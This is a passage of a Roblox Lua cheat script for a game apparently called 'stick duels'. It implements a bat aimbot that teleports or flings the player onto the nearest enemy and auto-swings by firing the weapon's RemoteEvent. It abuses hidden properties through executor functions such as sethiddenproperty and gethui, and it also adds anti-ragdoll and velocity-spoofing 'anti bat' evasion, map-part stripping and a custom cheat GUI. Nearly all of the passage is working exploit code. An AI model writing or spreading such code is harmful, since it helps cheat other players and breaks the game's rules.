        velocityHistory={}; accelerationHistory={}; aerialVelocityHistory={}; verticalVelocityHistory={}
        aerialSmoothVelocity=Vector3.zero; airborneTime=0; highYVelocityTime=0; previousDirection=nil; wasAirborne=false
        lastYVelocity=0; peakHeight=0; groundHeight=0; isMultiJumping=false; lastActivationTime=0
    end
    startFollowing(char)
    if M.autoBatSetVisual then M.autoBatSetVisual(true) end
    if M.mobBtnRefs.autoBat then M.mobBtnRefs.autoBat(true) end
end


function M.stopBatAimbot()
    if M.aimbotConn then
        pcall(function() M.aimbotConn:Disconnect() end)
        M.aimbotConn = nil
    end
    M._aimbotTarget = nil
    M._aimbotSwingCooldown = false
    M.autoBatEnabled = false
    M.autoBatEquippedThisRun = false

    local char = player.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if root then
        -- Scythe-style soft reset
        root.AssemblyLinearVelocity = root.AssemblyLinearVelocity * 0.3
        root.AssemblyAngularVelocity = Vector3.zero
    end
    local hum2 = char and char:FindFirstChildOfClass("Humanoid")
    if hum2 then hum2.AutoRotate = true end

    if M._autoTPWasEnabledForBat then
        M._autoTPWasEnabledForBat = false
        M.autoTPEnabled = true
        if M.setAutoTPVisual then M.setAutoTPVisual(true) end
        M.startAutoTP()
    end

    if M.autoBatSetVisual then M.autoBatSetVisual(false) end
    if M.mobBtnRefs.autoBat then M.mobBtnRefs.autoBat(false) end
end

function M.queueAutoBatStart()
    if not M.safeModeTryStart() then return end
    if M.antiKickEnabled and M.brainrotDetected then return end
    if M.autoLeftEnabled then M.autoLeftEnabled=false; if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end; M.stopAutoLeft() end
    if M.autoRightEnabled then M.autoRightEnabled=false; if M.autoRightSetVisual then M.autoRightSetVisual(false) end; M.stopAutoRight() end
    M.startBatAimbot()
end

function M.swingCurrentBatAimbot(char)
    if not M.autoSwingEnabled then return end
    local bat = M.findBatForAimbot()
    if bat and bat.Parent == char then
        pcall(function() bat:Activate() end)
    end
end

-- ============================================================
-- BAT TP (Galactic.CC style – soft CFrame TP + swing)
-- ============================================================
M._bypassTarget = nil
M._bypassHRP = nil
M._bypassHum = nil
M.tpBatRange = M.tpBatRange or 1e9 -- unlimited: always nearest enemy
M.tpBatClose = M.tpBatClose or 6
M.tpBatOffset = M.tpBatOffset or 2.4
M._tpBatLastSwing = 0
M._bypassSwingCooldown = false

function M._bypassFindBat()
    local char = player.Character
    if not char then return nil end
    local tool = char:FindFirstChild("Bat")
    if tool then return tool end
    local bp = player:FindFirstChild("Backpack") or player:FindFirstChildOfClass("Backpack")
    if bp then
        tool = bp:FindFirstChild("Bat")
        if tool then
            tool.Parent = char
            return tool
        end
    end
    return nil
end

function M._bypassTryHitBat()
    if M._bypassSwingCooldown then return end
    M._bypassSwingCooldown = true
    pcall(function()
        local bat = M._bypassFindBat()
        if bat then
            bat:Activate()
            local ev = bat:FindFirstChildWhichIsA("RemoteEvent")
            if ev then ev:FireServer() end
        end
    end)
    task.delay(0.08, function()
        M._bypassSwingCooldown = false
    end)
end

function M._bypassGetClosest()
    local root = M._bypassHRP or (player.Character and player.Character:FindFirstChild("HumanoidRootPart"))
    if not root then return nil, math.huge end
    local closest, minDist = nil, math.huge
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= player and plr.Character then
            local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
            local hum = plr.Character:FindFirstChildOfClass("Humanoid")
            if tRoot and hum and hum.Health > 0 then
                local dist = (root.Position - tRoot.Position).Magnitude
                if dist < minDist then
                    minDist = dist
                    closest = tRoot
                end
            end
        end
    end
    return closest, minDist
end

function M._bypassSetupChar(char)
    if not char then return end
    task.wait(0.1)
    M._bypassHum = char:FindFirstChildOfClass("Humanoid") or char:WaitForChild("Humanoid", 5)
    M._bypassHRP = char:FindFirstChild("HumanoidRootPart") or char:WaitForChild("HumanoidRootPart", 5)
    if M.bypassAimbotEnabled then
        M.stopBypassAimbot()
        M.startBypassAimbot()
    end
end

function M._bypassClearGodConns()
    for _, key in ipairs({"_bypassGodConn", "_bypassGodHealthConn", "_bypassGodDiedConn", "_bypassGodCharConn"}) do
        local c = M[key]
        if c then pcall(function() c:Disconnect() end); M[key] = nil end
    end
end

function M._bypassProtectCharacter(char)
end

function M.enableBypassGodmode()
end

function M.disableBypassGodmode()
    M._bypassClearGodConns()
end

function M.startBypassAimbot()
    if M.safeModeTryStart and not M.safeModeTryStart() then
        return
    end
    if M.bypassAimbotConn then
        pcall(function() M.bypassAimbotConn:Disconnect() end)
        M.bypassAimbotConn = nil
    end

    if M.tpBatEnabled then
        M.stopTpBat()
    end

    if M.autoLeftEnabled then
        M.autoLeftEnabled = false
        if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end
        M.stopAutoLeft()
    end
    if M.autoRightEnabled then
        M.autoRightEnabled = false
        if M.autoRightSetVisual then M.autoRightSetVisual(false) end
        M.stopAutoRight()
    end

    M.bypassAimbotEnabled = true
    M._bypassTarget = nil
    M._bypassSwingCooldown = false

    local char = player.Character
    if char then
        M._bypassHum = char:FindFirstChildOfClass("Humanoid")
        M._bypassHRP = char:FindFirstChild("HumanoidRootPart")
    end

    local batSpeed = tonumber(M.bypassBatSpeed) or 56.5
    local hitRange = tonumber(M.bypassHitDist) or 5

    M.bypassAimbotConn = RunService.Heartbeat:Connect(function()
        if not M.bypassAimbotEnabled then return end
        local hum = M._bypassHum
        local hrp = M._bypassHRP
        if not (hum and hrp and hrp.Parent) then
            local c = player.Character
            if not c then return end
            hum = c:FindFirstChildOfClass("Humanoid")
            hrp = c:FindFirstChild("HumanoidRootPart")
            M._bypassHum, M._bypassHRP = hum, hrp
            if not (hum and hrp) then return end
        end
        if hum.Health <= 0 then return end

        local target, dist = M._bypassGetClosest()
        if not target then
            M._bypassTarget = nil
            return
        end
        M._bypassTarget = target

        local fp = target.Position + target.CFrame.LookVector * 1.5
        local delta = fp - hrp.Position
        if delta.Magnitude < 0.01 then return end
        local dir = delta.Unit
        local spd = batSpeed
        hrp.Velocity = Vector3.new(dir.X * spd, dir.Y * spd, dir.Z * spd)

        if dist <= hitRange then
            M._bypassTryHitBat()
        end
    end)

    if M.setBypassVisual then M.setBypassVisual(true) end
    if M.mobBtnRefs.bypass then M.mobBtnRefs.bypass(true) end
end

function M.stopBypassAimbot()
    if M.bypassAimbotConn then
        pcall(function() M.bypassAimbotConn:Disconnect() end)
        M.bypassAimbotConn = nil
    end

    M.bypassAimbotEnabled = false
    M.disableBypassGodmode()
    M._bypassTarget = nil
    M._bypassSwingCooldown = false
    M.bypassHitCD = false

    if M.setBypassVisual then M.setBypassVisual(false) end
    if M.mobBtnRefs.bypass then M.mobBtnRefs.bypass(false) end
end

function M.toggleBypassAimbot()
    if M.bypassAimbotEnabled then
        M.stopBypassAimbot()
    else
        M.startBypassAimbot()
    end
    if M.setBypassVisual then
        M.setBypassVisual(M.bypassAimbotEnabled)
    end
    if M.mobBtnRefs.bypass then
        M.mobBtnRefs.bypass(M.bypassAimbotEnabled)
    end
    saveCherryConfig()
    return M.bypassAimbotEnabled
end



-- ============================================================
-- BAT TP (CFrame TP + camera lock + swing) — independiente de Bypass Aim
-- ============================================================
function M.startTpBat()
    if M.safeModeTryStart and not M.safeModeTryStart() then
        return
    end
    if M.tpBatConn then
        pcall(function() M.tpBatConn:Disconnect() end)
        M.tpBatConn = nil
    end

    -- No mezclar con Bypass Aim ni auto left/right
    if M.bypassAimbotEnabled then
        M.stopBypassAimbot()
    end
    if M.tpBatEnabled then
        M.stopTpBat()
    end
    if M.autoLeftEnabled then
        M.autoLeftEnabled = false
        if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end
        M.stopAutoLeft()
    end
    if M.autoRightEnabled then
        M.autoRightEnabled = false
        if M.autoRightSetVisual then M.autoRightSetVisual(false) end
        M.stopAutoRight()
    end

    M.tpBatEnabled = true
    M._bypassSwingCooldown = false

    local char = player.Character
    if char then
        M._bypassHum = char:FindFirstChildOfClass("Humanoid")
        M._bypassHRP = char:FindFirstChild("HumanoidRootPart")
    end

    M.tpBatConn = RunService.Heartbeat:Connect(function()
        if not M.tpBatEnabled then return end
        local char = player.Character
        if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        if not root then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum or hum.Health <= 0 then return end

        local bat = M._bypassFindBat()
        local target, dist = M._bypassGetClosest()
        if not target then
            return
        end

        if sethiddenproperty then
            pcall(function()
                sethiddenproperty(root, "PhysicsRepRootPart", target)
            end)
        end

        local targetPos = target.Position + Vector3.new(0, 0.9, 0)
        if (root.Position - targetPos).Magnitude > 8 then
            root.CFrame = CFrame.new(targetPos)
        end

        local camera = workspace.CurrentCamera
        if camera then
            pcall(function()
                camera.CFrame = CFrame.new(camera.CFrame.Position, target.Position)
            end)
        end

        if bat then
            M._bypassTryHitBat()
        end
    end)

    if M.mobBtnRefs.tpBat then M.mobBtnRefs.tpBat(true) end
end

function M.stopTpBat()
    if M.tpBatConn then
        pcall(function() M.tpBatConn:Disconnect() end)
        M.tpBatConn = nil
    end
    M.tpBatEnabled = false
    if M.mobBtnRefs.tpBat then M.mobBtnRefs.tpBat(false) end
end

function M.toggleTpBat()
    if M.tpBatEnabled then
        M.stopTpBat()
    else
        M.startTpBat()
    end
    if M.mobBtnRefs.tpBat then
        M.mobBtnRefs.tpBat(M.tpBatEnabled)
    end
    saveCherryConfig()
    return M.tpBatEnabled
end

function M.doAutoTPDown(force)
    local char=player.Character;if not char then return end;local hrp=char:FindFirstChild("HumanoidRootPart");if not hrp then return end
    local hum2=char:FindFirstChildOfClass("Humanoid");if not hum2 then return end
    if not force then if hum2.FloorMaterial~=Enum.Material.Air then return end;if not(hrp.Position.Y>=M.autoTPHeight) then return end end
    hrp.CFrame=CFrame.new(hrp.Position.X,-7.00,hrp.Position.Z)*CFrame.Angles(0,select(2,hrp.CFrame:ToEulerAnglesYXZ()),0);hrp.Velocity=Vector3.zero
end

function M.startAutoTP()
    M.autoTPEnabled = true
    if M.autoTPConn then
        pcall(function() task.cancel(M.autoTPConn) end)
        M.autoTPConn = nil
    end
    M.autoTPConn = task.spawn(function()
        while M.autoTPEnabled do
            pcall(function() M.doAutoTPDown(false) end)
            task.wait(0.08)
        end
    end)
end

function M.stopAutoTP()
    M.autoTPEnabled = false
    if M.autoTPConn then
        pcall(function() task.cancel(M.autoTPConn) end)
        M.autoTPConn = nil
    end
end

function M.runTPFloor() pcall(function() M.doAutoTPDown(true) end) end

function M.enableStretchRez()
    M.stretchRezEnabled=true;if M.stretchRezConn then M.stretchRezConn:Disconnect() end
    pcall(function() RunService:UnbindFromRenderStep("Movee_Stretch") end)
    pcall(function() RunService:BindToRenderStep("Movee_Stretch",Enum.RenderPriority.Last.Value-1,function() local cam=workspace.CurrentCamera;if cam then cam.CFrame=cam.CFrame*CFrame.new(0,0,0,1,0,0,0,0.8,0,0,0,1) end end) end)
end

function M.disableStretchRez() M.stretchRezEnabled=false;pcall(function() RunService:UnbindFromRenderStep("Movee_Stretch") end) end

--------------------------------------------------------------------------------
-- ANTI SUMMER BASE (ONLY remove blocking Anchor parts — never wipe bases)
--------------------------------------------------------------------------------
function M.isSummerBaseName(name)
    if not name then return false end
    local n = tostring(name):lower()
    -- strict: only explicit summer base names (not beach/palm/prop — those kill enemy bases)
    return n == "summerbase"
        or n == "summer_base"
        or n:find("summerbase", 1, true) ~= nil
        or n:find("summer_base", 1, true) ~= nil
end

function M.isAnchorName(name)
    if not name then return false end
    local n = tostring(name):lower()
    return n == "anchor" or n == "anchors"
end

function M.stripBlockingAnchor(obj)
    if not obj or not obj.Parent then return end
    local key = tostring(obj:GetFullName())
    if M._antiSummerCleaned[key] then return end
    M._antiSummerCleaned[key] = true
    pcall(function()
        if obj:IsA("BasePart") or obj:IsA("MeshPart") then
            obj.CanCollide = false
            obj.CanQuery = false
            obj.CanTouch = false
            obj.Transparency = 1
        end
        obj:Destroy()
    end)
end

function M.cleanSummerBaseAnchors()
    if not M.antiSummerBaseEnabled then return end
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return end

    -- Only scan Plots (not whole workspace — was causing lag + wiping bases)
    for _, plot in ipairs(plots:GetChildren()) do
        local isSummer = M.isSummerBaseName(plot.Name)
        if not isSummer then
            for _, d in ipairs(plot:GetDescendants()) do
                if M.isSummerBaseName(d.Name) then
                    isSummer = true
                    break
                end
            end
        end
        if not isSummer then continue end
        -- ONLY strip objects literally named Anchor / Anchors
        for _, d in ipairs(plot:GetDescendants()) do
            if M.isAnchorName(d.Name) then
                M.stripBlockingAnchor(d)
            end
        end
    end
end

function M.enableAntiSummerBase()
    M.antiSummerBaseEnabled = true
    M._antiSummerCleaned = {}
    M.cleanSummerBaseAnchors()
    if M.antiSummerBaseConn then
        pcall(function() M.antiSummerBaseConn:Disconnect() end)
        M.antiSummerBaseConn = nil
    end
    M.antiSummerBaseConn = workspace.DescendantAdded:Connect(function(obj)
        if not M.antiSummerBaseEnabled then return end
        if not M.isAnchorName(obj.Name) then return end
        task.defer(function()
            if not M.antiSummerBaseEnabled or not obj.Parent then return end
            -- only if under Plots and near a summer-named container
            local p = obj
            local underPlots, nearSummer = false, false
            while p and p ~= workspace do
                if p.Name == "Plots" or (p.Parent and p.Parent.Name == "Plots") then underPlots = true end
                if M.isSummerBaseName(p.Name) then nearSummer = true end
                p = p.Parent
            end
            if underPlots and nearSummer then
                M.stripBlockingAnchor(obj)
            end
        end)
    end)
    task.spawn(function()
        while M.antiSummerBaseEnabled do
            M.cleanSummerBaseAnchors()
            task.wait(5) -- slower scan = less lag
        end
    end)
end

function M.disableAntiSummerBase()
    M.antiSummerBaseEnabled = false
    if M.antiSummerBaseConn then
        pcall(function() M.antiSummerBaseConn:Disconnect() end)
        M.antiSummerBaseConn = nil
    end
end

function M._isUnderPlots(obj)
    local p = obj
    while p and p ~= workspace do
        if p.Name == "Plots" then return true end
        p = p.Parent
    end
    return false
end

function M.applyAntiLagDerender(obj)
    if not obj then return end
    -- NEVER touch enemy/player bases (Plots) — was making them transparent
    if M._isUnderPlots(obj) then return end
    pcall(function()
        if obj:IsA("Accessory") or obj:IsA("Hat") then
            -- only strip accessories on characters, not map models
            local char = obj:FindFirstAncestorOfClass("Model")
            if char and Players:GetPlayerFromCharacter(char) then
                obj:Destroy()
            end
        elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam")
            or obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") then
            obj.Enabled = false
        elseif obj:IsA("BasePart") or obj:IsA("MeshPart") then
            -- light optim only — do NOT force Transparency / wipe textures
            obj.CastShadow = false
            if obj.Reflectance and obj.Reflectance > 0 then
                obj.Reflectance = 0
            end
        end
        -- Decals/Textures on map intentionally left alone so bases stay visible
    end)
end

function M.enableAntiLag()
    M.removeAccessoriesEnabled = true
    M.antiLagEnabled = true
    M.defLightBrightness = M.defLightBrightness or Lighting.Brightness
    M.defLightClock = M.defLightClock or Lighting.ClockTime
    M.defLightAmbient = M.defLightAmbient or Lighting.OutdoorAmbient
    Lighting.GlobalShadows = false
    Lighting.FogEnd = 1e10
    Lighting.Brightness = 1
    Lighting.EnvironmentDiffuseScale = 0
    Lighting.EnvironmentSpecularScale = 0
    for _, e in pairs(Lighting:GetChildren()) do
        pcall(function()
            if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect")
                or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
                e.Enabled = false
            end
        end)
    end
    -- Only process characters + effects, skip Plots entirely
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr.Character then
            for _, obj in ipairs(plr.Character:GetDescendants()) do
                M.applyAntiLagDerender(obj)
            end
        end
    end
    if M.antiLagDescConn then M.antiLagDescConn:Disconnect() end
    M.antiLagDescConn = workspace.DescendantAdded:Connect(function(obj)
        if not M.antiLagEnabled then return end
        if M._isUnderPlots(obj) then return end
        M.applyAntiLagDerender(obj)
    end)
end

function M.disableAntiLag()
    M.removeAccessoriesEnabled=false;M.antiLagEnabled=false;if M.antiLagDescConn then M.antiLagDescConn:Disconnect();M.antiLagDescConn=nil end
    pcall(function() if M.defLightBrightness then Lighting.Brightness=M.defLightBrightness end;if M.defLightClock then Lighting.ClockTime=M.defLightClock end;if M.defLightAmbient then Lighting.OutdoorAmbient=M.defLightAmbient end;Lighting.ExposureCompensation=0 end)
end

-- ============================================================
-- ANTI-RAGDOLL
-- ============================================================
M.antiRagdollNoSplatterCooldown = 0

function M.forceNoSplatterReset()
    local char = player.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    local root = char:FindFirstChild("HumanoidRootPart")
    if not hum or not root or hum.Health <= 0 then return end

    pcall(function()
        hum:ChangeState(Enum.HumanoidStateType.GettingUp)
        root.Velocity = Vector3.zero
        root.RotVelocity = Vector3.zero
        root.AssemblyLinearVelocity = Vector3.zero
        root.AssemblyAngularVelocity = Vector3.zero

        for _, obj in ipairs(char:GetDescendants()) do
            if obj:IsA("Motor6D") then obj.Enabled = true end
            if obj:IsA("Constraint") then obj.Enabled = true end
        end

        workspace.CurrentCamera.CameraSubject = hum

        local PM = player.PlayerScripts:FindFirstChild("PlayerModule")
        if PM then
            local CM = require(PM:FindFirstChild("ControlModule"))
            if CM then CM:Enable() end
        end

        hum.AutoRotate = true
        hum.PlatformStand = false
        hum.Sit = false
    end)
end

function M.startAntiRagdoll()
    if M.Conns.antiRag then return end
    M.Conns.antiRag = RunService.Heartbeat:Connect(function()
        if not M.antiRagdollEnabled then return end
        local char = player.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        local root = char:FindFirstChild("HumanoidRootPart")
        if not hum or hum.Health <= 0 then return end

        local state = hum:GetState()
        local ragdolled = (state == Enum.HumanoidStateType.Physics or
                          state == Enum.HumanoidStateType.Ragdoll or
                          state == Enum.HumanoidStateType.FallingDown)

        if M.antiRagdollMode == "No Splatter" then
            if ragdolled then
                local now = tick()
                if now - (M.antiRagdollNoSplatterCooldown or 0) > 0.15 then
                    M.antiRagdollNoSplatterCooldown = now
                    M.forceNoSplatterReset()
                end
            end
            return
        end

        if not root then return end
        local endTime = player:GetAttribute("RagdollEndTime")
        if endTime and (endTime - workspace:GetServerTimeNow()) > 0 then
            ragdolled = true
        end
        if ragdolled then
            pcall(function()
                player:SetAttribute("RagdollEndTime", workspace:GetServerTimeNow())
            end)
            for _, d in ipairs(char:GetDescendants()) do
                if d:IsA("BallSocketConstraint") or
                   (d:IsA("Attachment") and d.Name:find("RagdollAttachment")) then
                    d:Destroy()
                end
            end
            for _, obj in ipairs(char:GetDescendants()) do
                if obj:IsA("Motor6D") and obj.Enabled == false then
                    obj.Enabled = true
                end
            end
            if hum.Health > 0 then
                hum:ChangeState(Enum.HumanoidStateType.Running)
            end
            workspace.CurrentCamera.CameraSubject = hum
            root.Anchored = false
            root.AssemblyLinearVelocity = Vector3.zero
            root.AssemblyAngularVelocity = Vector3.zero
        end
    end)
end

function M.stopAntiRagdoll()
    pcall(function() M.stopHardHit() end)
    pcall(function() M.destroyAntiBatUI() end)
    pcall(function() M.destroyLaggerUI() end)
    pcall(function() M.destroyBypassUI() end)
    if M.Conns.antiRag then
        M.Conns.antiRag:Disconnect()
        M.Conns.antiRag = nil
    end
end

-- ============================================================
-- HARD HIT (anillo de rango)
-- ============================================================
M.hardHitRing = nil
M.hardHitConn = nil
M.hardHitCharConn = nil

function M.hideHardHitRing()
    if M.hardHitRing then
        pcall(function() M.hardHitRing:Destroy() end)
        M.hardHitRing = nil
    end
end

function M.showHardHitRing()
    local char = player.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    M.hideHardHitRing()
    local ring = Instance.new("CylinderHandleAdornment")
    ring.Name = "HardHitRing"
    ring.Adornee = hrp
    ring.Color3 = Color3.fromRGB(255, 140, 0)
    ring.AlwaysOnTop = true
    ring.ZIndex = 5
    ring.Transparency = 0.15
    ring.Radius = M.hardHitRadius or 10
    ring.InnerRadius = math.max(0.1, (M.hardHitRadius or 10) - 0.35)
    ring.Height = 0.15
    ring.CFrame = CFrame.new(0, -3, 0)
    ring.Parent = hrp
    M.hardHitRing = ring
end

function M.updateHardHitRingRadius()
    local ring = M.hardHitRing
    if ring and ring.Parent then
        local r = M.hardHitRadius or 10
        ring.Radius = r
        ring.InnerRadius = math.max(0.1, r - 0.35)
    end
end

function M.stopHardHit()
    if M.hardHitConn then
        pcall(function() M.hardHitConn:Disconnect() end)
        M.hardHitConn = nil
    end
    if M.hardHitCharConn then
        pcall(function() M.hardHitCharConn:Disconnect() end)
        M.hardHitCharConn = nil
    end
    M.hideHardHitRing()
end

function M.startHardHit()
    M.stopHardHit()
    M.showHardHitRing()
    M.hardHitConn = RunService.Heartbeat:Connect(function()
        if not M.hardHitEnabled then return end
        local char = player.Character
        if not char then return end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        local ring = M.hardHitRing
        if not ring or not ring.Parent then
            M.showHardHitRing()
        else
            if ring.Adornee ~= hrp then
                ring.Adornee = hrp
                ring.Parent = hrp
            end
            M.updateHardHitRingRadius()
        end
    end)
    M.hardHitCharConn = player.CharacterAdded:Connect(function(char)
        if not M.hardHitEnabled then return end
        local hrp = char:WaitForChild("HumanoidRootPart", 5)
        if hrp then
            task.wait(0.1)
            M.showHardHitRing()
        end
    end)
end

function M.setHardHit(on)
    M.hardHitEnabled = on and true or false
    if M.hardHitEnabled then
        M.startHardHit()
    else
        M.stopHardHit()
    end
    if M.setHardHitVisual then M.setHardHitVisual(M.hardHitEnabled) end
end

function M.setHardHitRadius(v)
    v = tonumber(v) or 10
    M.hardHitRadius = math.clamp(v, 1, 100)
    if M.hardHitEnabled then
        M.updateHardHitRingRadius()
        if not M.hardHitRing or not M.hardHitRing.Parent then
            M.showHardHitRing()
        end
    end
end

-- ============================================================
-- ============================================================
-- ANTI BAT (panel: Anti Bat + Inf Jump + Hold + Key) — sin bugs
-- ============================================================
M.antiBatConn = nil
M.antiBatGui = nil
M.antiBatKeybind = Enum.KeyCode.K
M._antiBatKeyConn = nil
M._antiBatCharConn = nil
M._antiBatWaitingKey = false
M.antiBatPanelInfJump = false
M.antiBatPanelHoldJump = false
M._antiBatBusy = false

function M.stopAntiBatCore()
    M._antiBatBusy = false
    if M.antiBatConn then
        pcall(function() M.antiBatConn:Disconnect() end)
        M.antiBatConn = nil
    end
end

-- Logica Anti Bat estable (sin stack de yields / sin root muerto)
function M.startAntiBatCore()
    M.stopAntiBatCore()
    M._antiBatBusy = false
    M.antiBatConn = RunService.Heartbeat:Connect(function()
        if not M.antiBatEnabled then return end
        if M._antiBatBusy then return end
        local char = player.Character
        if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        if not root or not root.Parent then return end
        M._antiBatBusy = true
        local vx = root.Velocity.X
        local vy = root.Velocity.Y
        local vz = root.Velocity.Z
        root.Velocity = Vector3.new(1000, vy, 1000)
        RunService.RenderStepped:Wait()
        if root and root.Parent then
            root.Velocity = Vector3.new(vx, root.Velocity.Y, vz)
        end
        M._antiBatBusy = false
    end)
end

function M.destroyAntiBatUI()
    M.stopAntiBatCore()
    if M._antiBatKeyConn then
        pcall(function() M._antiBatKeyConn:Disconnect() end)
        M._antiBatKeyConn = nil
    end
    if M._antiBatCharConn then
        pcall(function() M._antiBatCharConn:Disconnect() end)
        M._antiBatCharConn = nil
    end
    if M.antiBatGui then
        pcall(function() M.antiBatGui:Destroy() end)
        M.antiBatGui = nil
    end
    M._antiBatWaitingKey = false
end

function M.buildAntiBatUI()
    M.destroyAntiBatUI()

    local ORANGE = Color3.fromRGB(255, 140, 0)
    local ORANGE_LT = Color3.fromRGB(255, 210, 160)
    local ORANGE_ON = Color3.fromRGB(255, 190, 50)
    local GREEN_ON = Color3.fromRGB(80, 255, 140)
    local BG = Color3.fromRGB(8, 8, 14)
    local CARD = Color3.fromRGB(18, 16, 28)
    local CARD2 = Color3.fromRGB(24, 20, 36)

    local gui = Instance.new("ScreenGui")
    gui.Name = "StickAntiBatUI"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.DisplayOrder = 50
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    pcall(function()
        if gethui then gui.Parent = gethui()
        else gui.Parent = game:GetService("CoreGui") end
    end)
    if not gui.Parent then gui.Parent = player:WaitForChild("PlayerGui") end
    M.antiBatGui = gui

    local PW, PH, MINI_H = 240, 268, 46
    local isMinimized = false

    local frame = Instance.new("Frame")
    frame.Name = "MainFrame"
    frame.Active = true
    frame.Size = UDim2.new(0, PW, 0, PH)
    frame.Position = UDim2.new(0.5, -PW/2, 0.5, -PH/2)
    frame.BackgroundColor3 = BG
    frame.BackgroundTransparency = 0.08
    frame.BorderSizePixel = 0
    frame.ClipsDescendants = true
    frame.Parent = gui
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 18)
    local mainStroke = Instance.new("UIStroke", frame)
    mainStroke.Color = ORANGE
    mainStroke.Thickness = 2
    mainStroke.Transparency = 0.25
    do
        local g = Instance.new("UIGradient", frame)
        g.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(14, 10, 22)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 6, 12)),
        })
        g.Rotation = 90
    end

    -- HEADER
    local header = Instance.new("Frame")
    header.Name = "Header"
    header.Size = UDim2.new(1, 0, 0, 46)
    header.BackgroundTransparency = 1
    header.Parent = frame

    local title = Instance.new("TextLabel")
    title.BackgroundTransparency = 1
    title.Position = UDim2.new(0, 16, 0, 4)
    title.Size = UDim2.new(1, -60, 0, 22)
    title.Font = Enum.Font.GothamBlack
    title.Text = "STICK ANTI BAT"
    title.TextColor3 = ORANGE
    title.TextSize = 15
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = header

    local subtitle = Instance.new("TextLabel")
    subtitle.BackgroundTransparency = 1
    subtitle.Position = UDim2.new(0, 16, 0, 26)
    subtitle.Size = UDim2.new(1, -60, 0, 14)
    subtitle.Font = Enum.Font.Gotham
    subtitle.Text = "stick duels"
    subtitle.TextColor3 = Color3.fromRGB(160, 140, 120)
    subtitle.TextSize = 10
    subtitle.TextXAlignment = Enum.TextXAlignment.Left
    subtitle.Parent = header

    local minBtn = Instance.new("TextButton")
    minBtn.Size = UDim2.new(0, 28, 0, 28)
    minBtn.Position = UDim2.new(1, -38, 0.5, -14)
    minBtn.BackgroundColor3 = CARD
    minBtn.Text = "−"
    minBtn.TextColor3 = ORANGE_LT
    minBtn.Font = Enum.Font.GothamBold
    minBtn.TextSize = 16
    minBtn.BorderSizePixel = 0
    minBtn.AutoButtonColor = false
    minBtn.Parent = header
    Instance.new("UICorner", minBtn).CornerRadius = UDim.new(0, 8)
    local minSt = Instance.new("UIStroke", minBtn)
    minSt.Color = ORANGE
    minSt.Thickness = 1
    minSt.Transparency = 0.4

    local content = Instance.new("Frame")
    content.Name = "Content"
    content.BackgroundTransparency = 1
    content.Position = UDim2.new(0, 14, 0, 50)
    content.Size = UDim2.new(1, -28, 1, -60)
    content.Parent = frame
    local list = Instance.new("UIListLayout", content)
    list.Padding = UDim.new(0, 8)
    list.SortOrder = Enum.SortOrder.LayoutOrder

    -- STATUS pill
    local statusRow = Instance.new("Frame")
    statusRow.LayoutOrder = 1
    statusRow.BackgroundColor3 = CARD
    statusRow.BackgroundTransparency = 0.3
    statusRow.Size = UDim2.new(1, 0, 0, 26)
    statusRow.BorderSizePixel = 0
    statusRow.Parent = content
    Instance.new("UICorner", statusRow).CornerRadius = UDim.new(0, 10)
    local statusDot = Instance.new("Frame")
    statusDot.Size = UDim2.new(0, 8, 0, 8)
    statusDot.Position = UDim2.new(0, 12, 0.5, -4)
    statusDot.BackgroundColor3 = Color3.fromRGB(255, 70, 100)
    statusDot.BorderSizePixel = 0
    statusDot.Parent = statusRow
    Instance.new("UICorner", statusDot).CornerRadius = UDim.new(1, 0)
    local statusLbl = Instance.new("TextLabel")
    statusLbl.BackgroundTransparency = 1
    statusLbl.Position = UDim2.new(0, 28, 0, 0)
    statusLbl.Size = UDim2.new(1, -36, 1, 0)
    statusLbl.Font = Enum.Font.GothamBold
    statusLbl.Text = "STATUS  ·  OFF"
    statusLbl.TextColor3 = Color3.fromRGB(255, 100, 120)
    statusLbl.TextSize = 11
    statusLbl.TextXAlignment = Enum.TextXAlignment.Left
    statusLbl.Parent = statusRow

    -- ACTIVATE button (grande, estilo moderno)
    local actRow = Instance.new("Frame")
    actRow.LayoutOrder = 2
    actRow.Size = UDim2.new(1, 0, 0, 48)
    actRow.BackgroundColor3 = Color3.fromRGB(45, 28, 12)
    actRow.BorderSizePixel = 0
    actRow.Parent = content
    Instance.new("UICorner", actRow).CornerRadius = UDim.new(0, 14)
    local actStroke = Instance.new("UIStroke", actRow)
    actStroke.Color = ORANGE
    actStroke.Thickness = 2
    actStroke.Transparency = 0.1
    local actBtn = Instance.new("TextButton")
    actBtn.Size = UDim2.new(1, 0, 1, 0)
    actBtn.BackgroundTransparency = 1
    actBtn.Text = "○  ACTIVAR"
    actBtn.Font = Enum.Font.GothamBlack
    actBtn.TextSize = 14
    actBtn.TextColor3 = Color3.fromRGB(255, 220, 170)
    actBtn.AutoButtonColor = false
    actBtn.Parent = actRow
    local actGrad = Instance.new("UIGradient", actRow)
    actGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 22, 10)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 14, 28)),
    })
    actGrad.Rotation = 90

    -- Modern switch row (ON/OFF label style)
